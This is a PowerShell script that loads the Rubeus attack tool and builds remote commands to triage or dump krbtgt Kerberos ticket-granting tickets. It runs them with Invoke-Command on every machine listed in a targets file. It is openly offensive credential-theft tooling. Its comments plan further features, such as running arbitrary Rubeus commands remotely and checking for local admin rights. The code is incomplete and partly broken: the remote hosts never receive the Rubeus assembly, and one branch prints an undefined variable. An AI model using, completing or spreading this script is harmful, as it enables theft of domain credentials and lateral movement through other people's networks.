param (
    # Allow RubeusFile to be loaded from remote UNC path or over HTTP
    [Parameter(Mandatory=$true)][ValidateScript({
        if ( -Not ($_ | Test-Path )){
            throw "The specified Rubeus file does not exist"
        }
        if ( -Not ($_ | Test-Path -PathType Leaf )){
            throw "The Rubeus file must be a file. Folder paths are not allowed"
        } 
        if ( $_ -notmatch "(\.exe)"){
            throw "The Rubeus file must be of type exe"
        }     
        return $true
    })]
    [System.IO.FileInfo]$RubeusFile,
    [ValidateScript({
        if ( -Not ($_ | Test-Path )){
            throw "The specified targets file does not exist"
        }
        if ( -Not ($_ | Test-Path -PathType Leaf )){
            throw "The targets file must be a file. Folder paths are not allowed"
        } 
        return $true
    })]
    [System.IO.FileInfo]$TargetsFile,
    [switch]$ListTGTs, 
    [switch]$DumpTGTs
    )

$RubeusBase64String = [Convert]::ToBase64String([IO.File]::ReadAllBytes($RubeusFile))
$RubeusAssembly = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($RubeusBase64String))
$ScriptBlockString = ""
# Add "RubeusArgs" option to specify arbitrary Rubeus command to execute on remote machine
# Add "TargetUser" and "TargetGroup" options
# Check if 5985 is open
# Check local admin privs
# Check time and compare to TGT validity
if ( $ListTGTs )
{
    $ScriptBlockString += '$($env:computername);'
    $ScriptBlockString += '[Rubeus.Program]::MainString("triage /service:krbtgt")'
}
if ( $DumpTGTs )
{
    $ScriptBlockString += '$($env:computername);'
    $ScriptBlockString += '[Rubeus.Program]::MainString("dump /service:krbtgt /nowrap")'
}
if ( $TargetsFile )
{
    $Targets = Get-Content $TargetsFile
    foreach ( $Target in $Targets )
    {
    $ScriptBlock = [Scriptblock]::Create($ScriptBlockString)
    # The remote system doesn't know about Rubeus -- need to pull in the data with DownloadData or transfer file
    # Try and load from base64 string
    $Result = Invoke-Command -ComputerName $Target -ScriptBlock $ScriptBlock
    $Result
    }
}
else
{
    $ScriptBlock
}